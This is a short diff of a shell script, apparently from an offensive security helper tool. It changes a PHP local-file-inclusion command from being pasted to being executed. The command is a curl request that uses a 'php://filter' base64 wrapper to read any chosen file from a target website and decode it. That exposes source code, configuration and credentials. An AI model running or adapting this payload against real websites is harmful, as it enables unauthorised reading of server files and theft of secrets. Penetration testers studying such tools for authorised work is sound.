@@ -14,4 +14,4 @@ generate_form "${WEBSITE_FIELD}" "${FILE_FIELD}"
 WEBSITE=${form_data["website"]}
 FILE=${form_data["file"]}
 
-paste_command "curl -ks '${WEBSITE}php://filter/read=convert.base64-encode/resource=${FILE}' | base64 -d"
+execute_command "curl -ks '${WEBSITE}php://filter/read=convert.base64-encode/resource=${FILE}' | base64 -d"
